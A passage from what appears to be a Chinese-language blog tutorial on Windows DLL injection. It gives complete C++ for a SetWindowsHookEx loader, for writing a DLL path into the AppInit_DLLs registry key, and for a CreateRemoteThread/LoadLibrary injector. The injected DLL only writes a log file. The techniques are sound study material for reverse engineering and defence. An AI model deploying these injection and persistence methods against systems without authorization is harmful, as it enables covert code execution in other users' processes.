	<span class="n">WriteFile</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">szHead</span><span class="p">,</span> <span class="n">lstrlen</span><span class="p">(</span><span class="n">szHead</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">dwWriteSize</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">WriteFile</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">szData</span><span class="p">,</span> <span class="n">lstrlen</span><span class="p">(</span><span class="n">szData</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">dwWriteSize</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

	<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hFile</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>


<span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span><span class="p">(</span> <span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span>
                       <span class="n">DWORD</span>  <span class="n">ul_reason_for_call</span><span class="p">,</span>
                       <span class="n">LPVOID</span> <span class="n">lpReserved</span>
					 <span class="p">)</span>
<span class="p">{</span>
	<span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">)</span>
	<span class="p">{</span>
	<span class="k">case</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">:</span>
		<span class="n">WriteLog</span><span class="p">(</span><span class="s">"DLL_PROCESS_ATTACH</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="k">break</span><span class="p">;</span>
	<span class="k">case</span> <span class="n">DLL_THREAD_ATTACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
	<span class="k">case</span> <span class="n">DLL_THREAD_DETACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
	<span class="k">case</span> <span class="n">DLL_PROCESS_DETACH</span><span class="p">:</span>
		<span class="n">WriteLog</span><span class="p">(</span><span class="s">"DLL_PROCESS_DETACH</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="k">break</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>向以上代码添加代码，使得在DLL成功加载之后，向<code class="highlighter-rouge">%TEMP%</code>目录输出一个名为loging.log的日志文件。日志内容是进程ID和模块路径。</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// setwindowshook.cpp
//
</span>
<span class="cp">#include "stdafx.h"
#include &lt;Windows.h&gt;
</span>

<span class="kt">int</span> <span class="nf">_tmain</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">_TCHAR</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
	<span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">){</span>
		<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"%s &lt;DLL Name&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="n">HMODULE</span> <span class="n">h</span> <span class="o">=</span> <span class="n">LoadLibrary</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
	<span class="k">if</span><span class="p">(</span><span class="n">h</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>

	<span class="kt">int</span> <span class="p">(</span><span class="kr">__stdcall</span> <span class="o">*</span><span class="n">fcall</span><span class="p">)</span> <span class="p">(</span><span class="n">VOID</span><span class="p">);</span>
	<span class="n">fcall</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span><span class="p">)(</span><span class="n">VOID</span><span class="p">))</span>
		<span class="n">GetProcAddress</span><span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="s">"CallSetWindowsHookEx"</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="n">fcall</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">){</span>
		<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"ERROR: GetProcAddress</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="k">goto</span> <span class="n">_Exit</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="kt">int</span> <span class="p">(</span><span class="kr">__stdcall</span> <span class="o">*</span><span class="n">ffree</span><span class="p">)</span> <span class="p">(</span><span class="n">VOID</span><span class="p">);</span>
	<span class="n">ffree</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span><span class="p">)(</span><span class="n">VOID</span><span class="p">))</span>
		<span class="n">GetProcAddress</span><span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="s">"CallUnhookWindowsHookEx"</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="n">ffree</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">){</span>
		<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"ERROR: GetProcAddress</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="k">goto</span> <span class="n">_Exit</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="k">if</span><span class="p">(</span><span class="n">fcall</span><span class="p">()){</span>
		<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"ERROR: CallSetWindowsHookEx</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="k">goto</span> <span class="n">_Exit</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"Call SetWindowsHookEx</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

	<span class="n">getchar</span><span class="p">();</span>

	<span class="k">if</span><span class="p">(</span><span class="n">ffree</span><span class="p">()){</span>
		<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"ERROR: CallUnhookWindowsHookEx</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="k">goto</span> <span class="n">_Exit</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"Call UnhookWindowsHookEx</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

<span class="nl">_Exit:</span>
	<span class="n">FreeLibrary</span><span class="p">(</span><span class="n">h</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>打开<code class="highlighter-rouge">C:\Users\b404\AppData\Local\Temp\loging.log</code>文件：</p>

<p><img src="/img/interestingBin/1491377631991.png" alt="运行效果" /></p>

<h3 id="将dll路径配置到注册表的applnit_dlls项">将DLL路径配置到注册表的AppLnit_DLLs项</h3>

<p>SetWindowsHookEx可以在调用时，将DLL映射到其他进程中，不过若将DLL的路径配置在注册表的AppInit_DLLs项中，就可以在系统启动时，将任意DLL加载到其他进程中。
运行regedit,在<code class="highlighter-rouge">SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code>中找到<code class="highlighter-rouge">AppInit_DLLs</code>（在这里填写DLL路径）和<code class="highlighter-rouge">LoadAppInit_DLLs</code>（AppInit_DLLs启用或禁止）
<img src="/img/interestingBin/1491378176972.png" alt="Alt text" /></p>

<blockquote>
  <p>Widows XP中没有LoadAppInit_DLLs这项。在Win7中多了一个叫做<code class="highlighter-rouge">RequireSignedAppInit_DLLs</code>的项，这一项代表只允许加载经过签名的DLL。</p>
</blockquote>

<p>详细可看：<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/dd744762(v=vs.85).aspx">AppInit_DLLs in Windows 7 and Windows Server 2008 R2</a></p>

<p>在x64系统中，关于x32程序的相关设定已被重定向到Wow6432Node中。
AppInit_DLLs中所配置的DLL是通过user32.dll来加载的，因此，对于原本就不依赖(不加载)user32.dll的进程来说，这个配置是无效的。</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// writeappinit.cpp
//
</span>
<span class="cp">#include "stdafx.h"
#include &lt;Windows.h&gt;
</span>

<span class="kt">int</span> <span class="nf">_tmain</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">_TCHAR</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
	<span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">){</span>
		<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"%s &lt;DLL Name&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	
	<span class="n">HKEY</span> <span class="n">hKey</span><span class="p">;</span>
	<span class="n">LSTATUS</span> <span class="n">lResult</span> <span class="o">=</span> <span class="n">RegOpenKeyEx</span><span class="p">(</span><span class="n">HKEY_LOCAL_MACHINE</span><span class="p">,</span> 
		<span class="s">"SOFTWARE</span><span class="se">\\</span><span class="s">Microsoft</span><span class="se">\\</span><span class="s">Windows NT</span><span class="se">\\</span><span class="s">CurrentVersion</span><span class="se">\\</span><span class="s">Windows"</span><span class="p">,</span>
		<span class="nb">NULL</span><span class="p">,</span> <span class="n">KEY_ALL_ACCESS</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hKey</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="n">lResult</span> <span class="o">!=</span> <span class="n">ERROR_SUCCESS</span><span class="p">){</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"Error: RegOpenKeyEx failed.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="n">DWORD</span> <span class="n">dwSize</span><span class="p">,</span> <span class="n">dwType</span><span class="p">;</span>
	<span class="n">TCHAR</span> <span class="n">szDllName</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>

	<span class="n">RegQueryValueEx</span><span class="p">(</span><span class="n">hKey</span><span class="p">,</span> <span class="s">"AppInit_DLLs"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwType</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwSize</span><span class="p">);</span>
    <span class="n">RegQueryValueEx</span><span class="p">(</span><span class="n">hKey</span><span class="p">,</span> <span class="s">"AppInit_DLLs"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwType</span><span class="p">,</span> <span class="p">(</span><span class="n">LPBYTE</span><span class="p">)</span><span class="n">szDllName</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwSize</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"AppInit_DLLs: %s -&gt; "</span><span class="p">,</span> <span class="n">szDllName</span><span class="p">);</span>
	<span class="n">lstrcpy</span><span class="p">(</span><span class="n">szDllName</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
	
	<span class="n">lResult</span> <span class="o">=</span> <span class="n">RegSetValueEx</span><span class="p">(</span><span class="n">hKey</span><span class="p">,</span> <span class="s">"AppInit_DLLs"</span><span class="p">,</span> 
		<span class="mi">0</span><span class="p">,</span> <span class="n">REG_SZ</span><span class="p">,</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">szDllName</span><span class="p">,</span> <span class="n">lstrlen</span><span class="p">(</span><span class="n">szDllName</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="n">lResult</span> <span class="o">!=</span> <span class="n">ERROR_SUCCESS</span><span class="p">){</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"Error: RegSetValueEx failed.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="n">RegQueryValueEx</span><span class="p">(</span><span class="n">hKey</span><span class="p">,</span> <span class="s">"AppInit_DLLs"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwType</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwSize</span><span class="p">);</span>
    <span class="n">RegQueryValueEx</span><span class="p">(</span><span class="n">hKey</span><span class="p">,</span> <span class="s">"AppInit_DLLs"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwType</span><span class="p">,</span> <span class="p">(</span><span class="n">LPBYTE</span><span class="p">)</span><span class="n">szDllName</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwSize</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">szDllName</span><span class="p">);</span>

	<span class="n">RegCloseKey</span><span class="p">(</span><span class="n">hKey</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>运行程序：
<img src="/img/interestingBin/1491382019538.png" alt="Alt text" /></p>

<blockquote>
  <p>在Win7中，需要将<code class="highlighter-rouge">LoadAppInit_DLLs</code>的值改为1</p>
</blockquote>

<p>使用该程序向注册表的AppInit_DLLs项写入loging.dll的路径。此后，凡是加载了user32.dll的进程，同时也会加载<code class="highlighter-rouge">loging.dll</code>。</p>

<h3 id="通过createremotethread在其他进程中创建线程">通过CreateRemoteThread在其他进程中创建线程</h3>

<p>使用<code class="highlighter-rouge">CreateRemoteThread</code>这个API函数在其他进程中创建线程，这个函数可以在新线程中运行LoadLibrary，从而使得其他进程强制加载某个DLL。</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HANDLE</span> <span class="n">WINAPI</span> <span class="n">CreateRemoteThread</span><span class="p">(</span>
  <span class="n">_In_</span>  <span class="n">HANDLE</span>                 <span class="n">hProcess</span><span class="p">,</span>  <span class="c1">//进程句柄
</span>  <span class="n">_In_</span>  <span class="n">LPSECURITY_ATTRIBUTES</span>  <span class="n">lpThreadAttributes</span><span class="p">,</span> 
  <span class="n">_In_</span>  <span class="n">SIZE_T</span>                 <span class="n">dwStackSize</span><span class="p">,</span> <span class="c1">//栈初始长度(字节数)
</span>  <span class="n">_In_</span>  <span class="n">LPTHREAD_START_ROUTINE</span> <span class="n">lpStartAddress</span><span class="p">,</span> 
  <span class="n">_In_</span>  <span class="n">LPVOID</span>                 <span class="n">lpParameter</span><span class="p">,</span> <span class="c1">//新线程的参数指针
</span>  <span class="n">_In_</span>  <span class="n">DWORD</span>                  <span class="n">dwCreationFlags</span><span class="p">,</span> <span class="c1">//创建标志
</span>  <span class="n">_Out_</span> <span class="n">LPDWORD</span>                <span class="n">lpThreadId</span> <span class="c1">//分配的线程ID指针
</span><span class="p">);</span>
</code></pre></div></div>

<p><strong>Loadlibrary的参数必须位于目标进程内部。因此，LoadLibrary所需要的参数字符串必须事先写入目标进程的内存空间</strong></p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// injectcode.h
</span>
<span class="kt">int</span> <span class="n">InjectDLLtoProcessFromName</span><span class="p">(</span><span class="n">TCHAR</span> <span class="o">*</span><span class="n">szTarget</span><span class="p">,</span> <span class="n">TCHAR</span> <span class="o">*</span><span class="n">szDllPath</span><span class="p">);</span>
<span class="kt">int</span> <span class="n">InjectDLLtoProcessFromPid</span><span class="p">(</span><span class="n">DWORD</span> <span class="n">dwPid</span><span class="p">,</span> <span class="n">TCHAR</span> <span class="o">*</span><span class="n">szDllPath</span><span class="p">);</span>
<span class="kt">int</span> <span class="n">InjectDLLtoNewProcess</span><span class="p">(</span><span class="n">TCHAR</span> <span class="o">*</span><span class="n">szCommandLine</span><span class="p">,</span> <span class="n">TCHAR</span> <span class="o">*</span><span class="n">szDllPath</span><span class="p">);</span>
</code></pre></div></div>

<p>上面三个函数的功能：</p>
<ul>
  <li>InjectDLLtoProcessFromName:按照可执行文件名找到相应的进程并注入DLL</li>
  <li>InjectDLLtoProcessFromPid：按照进程ID找到相应的进程并注入DLL</li>
  <li>创建新进程并注入DLL</li>
</ul>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// injectcode.cpp
//
</span>
<span class="cp">#include "stdafx.h"
#include &lt;tlhelp32.h&gt;
#include "injectcode.h"
</span>

<span class="n">DWORD</span> <span class="nf">GetProcessIdFromName</span><span class="p">(</span><span class="n">TCHAR</span> <span class="o">*</span><span class="n">szTargetProcessName</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">HANDLE</span> <span class="n">hSnap</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPPROCESS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	
	<span class="k">if</span><span class="p">(</span><span class="n">hSnap</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span>
		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
	
	<span class="n">PROCESSENTRY32</span> <span class="n">pe</span><span class="p">;</span>
	<span class="n">pe</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">pe</span><span class="p">);</span>
	
	<span class="n">DWORD</span> <span class="n">dwProcessId</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">BOOL</span> <span class="n">bResult</span> <span class="o">=</span> <span class="n">Process32First</span><span class="p">(</span><span class="n">hSnap</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe</span><span class="p">);</span>

	<span class="k">while</span><span class="p">(</span><span class="n">bResult</span><span class="p">){</span>
		<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">lstrcmp</span><span class="p">(</span><span class="n">pe</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">,</span> <span class="n">szTargetProcessName</span><span class="p">)){</span>
			<span class="n">dwProcessId</span> <span class="o">=</span> <span class="n">pe</span><span class="p">.</span><span class="n">th32ProcessID</span><span class="p">;</span>
			<span class="k">break</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="n">bResult</span> <span class="o">=</span> <span class="n">Process32Next</span><span class="p">(</span><span class="n">hSnap</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSnap</span><span class="p">);</span>
	
	<span class="k">return</span> <span class="n">dwProcessId</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="nf">InjectDLL</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">TCHAR</span> <span class="o">*</span><span class="n">szDllPath</span><span class="p">)</span>
<span class="p">{</span>
	<span class="kt">int</span> <span class="n">szDllPathLen</span> <span class="o">=</span> <span class="n">lstrlen</span><span class="p">(</span><span class="n">szDllPath</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>

	<span class="n">PWSTR</span> <span class="n">RemoteProcessMemory</span> <span class="o">=</span> <span class="p">(</span><span class="n">PWSTR</span><span class="p">)</span><span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> 
		<span class="nb">NULL</span><span class="p">,</span> <span class="n">szDllPathLen</span><span class="p">,</span> <span class="n">MEM_RESERVE</span><span class="o">|</span><span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="n">RemoteProcessMemory</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	
	<span class="n">BOOL</span> <span class="n">bRet</span> <span class="o">=</span> <span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> 
		<span class="n">RemoteProcessMemory</span><span class="p">,</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span><span class="n">szDllPath</span><span class="p">,</span> <span class="n">szDllPathLen</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="n">bRet</span> <span class="o">==</span> <span class="n">FALSE</span><span class="p">)</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	
	<span class="n">PTHREAD_START_ROUTINE</span> <span class="n">pfnThreadRtn</span><span class="p">;</span>
	<span class="n">pfnThreadRtn</span> <span class="o">=</span> <span class="p">(</span><span class="n">PTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span>
		<span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"kernel32"</span><span class="p">),</span> <span class="s">"LoadLibraryA"</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="n">pfnThreadRtn</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	
	<span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateRemoteThread</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> 
		<span class="n">pfnThreadRtn</span><span class="p">,</span> <span class="n">RemoteProcessMemory</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="n">hThread</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>

	<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">);</span>
	
	<span class="n">VirtualFreeEx</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> 
		<span class="n">RemoteProcessMemory</span><span class="p">,</span> <span class="n">szDllPathLen</span><span class="p">,</span> <span class="n">MEM_RELEASE</span><span class="p">);</span>

	<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hThread</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="nf">InjectDLLtoExistedProcess</span><span class="p">(</span><span class="n">DWORD</span> <span class="n">dwPid</span><span class="p">,</span> <span class="n">TCHAR</span> <span class="o">*</span><span class="n">szDllPath</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">HANDLE</span> <span class="n">hProcess</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span>
		<span class="n">PROCESS_CREATE_THREAD</span> <span class="o">|</span> <span class="n">PROCESS_VM_READ</span> <span class="o">|</span> <span class="n">PROCESS_VM_WRITE</span> <span class="o">|</span> 
		<span class="n">PROCESS_VM_OPERATION</span> <span class="o">|</span> <span class="n">PROCESS_QUERY_INFORMATION</span> <span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">dwPid</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="n">hProcess</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="cm">/*
	BOOL bJudgeWow64;
	IsWow64Process(hProcess, &amp;bJudgeWow64);
	if(bJudgeWow64 == FALSE){
		CloseHandle(hProcess);
		return -1;
	}
	*/</span>
	<span class="k">if</span><span class="p">(</span><span class="n">InjectDLL</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">szDllPath</span><span class="p">))</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>

	<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProcess</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="nf">InjectDLLtoProcessFromName</span><span class="p">(</span><span class="n">TCHAR</span> <span class="o">*</span><span class="n">szTarget</span><span class="p">,</span> <span class="n">TCHAR</span> <span class="o">*</span><span class="n">szDllPath</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">DWORD</span> <span class="n">dwPid</span> <span class="o">=</span> <span class="n">GetProcessIdFromName</span><span class="p">(</span><span class="n">szTarget</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="n">dwPid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="k">if</span><span class="p">(</span><span class="n">InjectDLLtoExistedProcess</span><span class="p">(</span><span class="n">dwPid</span><span class="p">,</span> <span class="n">szDllPath</span><span class="p">))</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="nf">InjectDLLtoProcessFromPid</span><span class="p">(</span><span class="n">DWORD</span> <span class="n">dwPid</span><span class="p">,</span> <span class="n">TCHAR</span> <span class="o">*</span><span class="n">szDllPath</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">if</span><span class="p">(</span><span class="n">InjectDLLtoExistedProcess</span><span class="p">(</span><span class="n">dwPid</span><span class="p">,</span> <span class="n">szDllPath</span><span class="p">))</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="nf">InjectDLLtoNewProcess</span><span class="p">(</span><span class="n">TCHAR</span> <span class="o">*</span><span class="n">szCommandLine</span><span class="p">,</span> <span class="n">TCHAR</span> <span class="o">*</span><span class="n">szDllPath</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">STARTUPINFO</span> <span class="n">si</span><span class="p">;</span>
	<span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span><span class="p">;</span>

	<span class="n">ZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">STARTUPINFO</span><span class="p">));</span>
	<span class="n">si</span><span class="p">.</span><span class="n">cb</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">STARTUPINFO</span><span class="p">);</span>

	<span class="n">BOOL</span> <span class="n">bResult</span> <span class="o">=</span> <span class="n">CreateProcess</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">szCommandLine</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>
		<span class="n">FALSE</span><span class="p">,</span> <span class="n">CREATE_SUSPENDED</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="n">bResult</span> <span class="o">==</span> <span class="n">FALSE</span><span class="p">)</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>

	<span class="kt">int</span> <span class="n">nRet</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="cm">/*
	BOOL bJudgeWow64;
	IsWow64Process(pi.hProcess, &amp;bJudgeWow64);
	if(bJudgeWow64 == FALSE)
		goto _Exit;
	*/</span>
	<span class="k">if</span><span class="p">(</span><span class="n">InjectDLL</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">szDllPath</span><span class="p">))</span>
		<span class="k">goto</span> <span class="n">_Exit</span><span class="p">;</span>

	<span class="n">nRet</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

<span class="nl">_Exit:</span>
	<span class="n">ResumeThread</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
	<span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
	<span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">);</span>
	<span class="k">return</span> <span class="n">nRet</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>运行该程序时，以及IE关闭时都会弹出相应的消息框。</p>

<h3 id="注入函数">注入函数</h3>

<p>只要能够将任意函数(代码)事先复制到目标进程内部，就可以用<code class="highlighter-rouge">CreateRemoteThread</code>来运行。</p>

<blockquote>
